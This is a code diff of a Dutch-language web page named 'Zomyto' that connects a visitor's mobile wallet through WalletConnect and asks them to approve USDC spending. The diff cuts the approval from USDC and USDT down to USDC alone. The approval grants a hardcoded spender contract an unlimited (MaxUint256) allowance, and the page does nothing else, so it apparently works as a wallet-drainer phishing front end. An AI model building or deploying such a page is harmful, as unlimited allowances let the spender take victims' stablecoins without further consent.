@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Zomyto – Approve Stablecoins (WC v2 via jsDelivr)</title>
+  <title>Zomyto – Test WalletConnect + USDC Approve</title>
 
   <!-- Ethers v5 via jsDelivr -->
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
@@ -37,20 +37,21 @@
       margin-top: 20px;
       font-size: 0.9rem;
       color: #ccc;
+      white-space: pre-line;
     }
   </style>
 </head>
 <body>
-  <h1>Zomyto – Approve Stablecoins</h1>
+  <h1>Zomyto – Test WalletConnect + USDC Approve</h1>
   <p>
     1. Klik op <b>Connect Wallet</b> en scan de QR met je mobiele wallet (Exodus).<br />
-    2. Klik daarna op <b>Approve USDC &amp; USDT</b> om toestemming te geven aan het Zomyto-contract.
+    2. Klik daarna op <b>Approve USDC</b> om toestemming te geven aan het Zomyto-contract.
   </p>
 
   <button id="connectBtn">🔗 Connect Wallet (WalletConnect v2)</button>
 
   <div style="margin-top: 30px">
-    <button id="approveBtn" disabled>✅ Approve USDC &amp; USDT</button>
+    <button id="approveBtn" disabled>✅ Approve USDC</button>
   </div>
 
   <div id="status">Status: Niet verbonden</div>
@@ -62,11 +63,11 @@
     // Ethereum mainnet chainId
     const CHAIN_ID = 1;
 
-    // ERC20 tokens op mainnet
-    const TOKENS = [
-      { name: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
-      { name: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" }
-    ];
+    // Alleen USDC om te testen
+    const USDC = {
+      name: "USDC",
+      address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
+    };
 
     // JOUW contract dat toestemming krijgt
     const SPENDER = "0x2F6DAC950c8e2433734Fe50bC72F18E2d2dD8f2A";
@@ -88,18 +89,20 @@
       statusEl.textContent = "Status: " + msg;
     }
 
+    console.log("window.ethers =", window.ethers);
+    console.log("window.WalletConnectEthereumProvider =", window.WalletConnectEthereumProvider);
+
     // ====== CONNECT WALLET VIA WALLETCONNECT V2 ======
     connectBtn.onclick = async () => {
       try {
         setStatus("WalletConnect initialiseren...");
 
         if (!window.WalletConnectEthereumProvider) {
-          setStatus("WalletConnectEthereumProvider is niet beschikbaar (script geblokkeerd?).");
+          setStatus("WalletConnectEthereumProvider is niet beschikbaar. Script geblokkeerd?");
           alert("WalletConnectEthereumProvider is niet beschikbaar. Controleer of cdn.jsdelivr.net niet geblokkeerd wordt (adblocker / netwerk).");
           return;
         }
 
-        // Maak een WC v2 provider
         wcProvider = await window.WalletConnectEthereumProvider.init({
           projectId,
           showQrModal: true,
@@ -109,11 +112,9 @@
           }
         });
 
-        // Vraag om accounts (triggert QR als nog niet verbonden)
         const accounts = await wcProvider.enable();
         console.log("Accounts:", accounts);
 
-        // Ethers provider & signer
         ethersProvider = new ethers.providers.Web3Provider(wcProvider, "any");
         signer = ethersProvider.getSigner();
 
@@ -126,15 +127,6 @@
         }
 
         approveBtn.disabled = false;
-
-        // Events
-        wcProvider.on("accountsChanged", (accs) => {
-          console.log("accountsChanged:", accs);
-        });
-
-        wcProvider.on("chainChanged", (chainId) => {
-          console.log("chainChanged:", chainId);
-        });
 
         wcProvider.on("disconnect", () => {
           console.log("disconnect");
@@ -152,7 +144,7 @@
       }
     };
 
-    // ====== APPROVE-KNOP ======
+    // ====== APPROVE-KNOP (ALLEEN USDC) ======
     approveBtn.onclick = async () => {
       if (!signer) {
         alert("Geen signer gevonden. Verbind eerst je wallet via Connect Wallet.");
@@ -160,19 +152,16 @@
       }
 
       try {
-        for (const t of TOKENS) {
-          setStatus(`Verstuur approve transactie voor ${t.name}...`);
-          const token = new ethers.Contract(t.address, tokenABI, signer);
+        setStatus(`Verstuur approve transactie voor ${USDC.name}...`);
+        const token = new ethers.Contract(USDC.address, tokenABI, signer);
 
-          // MaxUint256 = onbeperkte toestemming
-          const tx = await token.approve(SPENDER, ethers.constants.MaxUint256);
-          setStatus(`Wachten op bevestiging van ${t.name} transactie...`);
-          await tx.wait();
-          console.log(`✅ Approved ${t.name}`);
-        }
+        const tx = await token.approve(SPENDER, ethers.constants.MaxUint256);
+        setStatus(`Wachten op bevestiging van ${USDC.name} transactie...`);
+        await tx.wait();
+        console.log(`✅ Approved ${USDC.name}`);
 
-        setStatus("USDC & USLT succesvol goedgekeurd!");
-        alert("USDC & USDT succesvol goedgekeurd!");
+        setStatus("USDC succesvol goedgekeurd!");
+        alert("USDC succesvol goedgekeurd!");
       } catch (err) {
         console.error("Fout bij approve:", err);
         setStatus("Fout bij approve: " + (err.message || err));
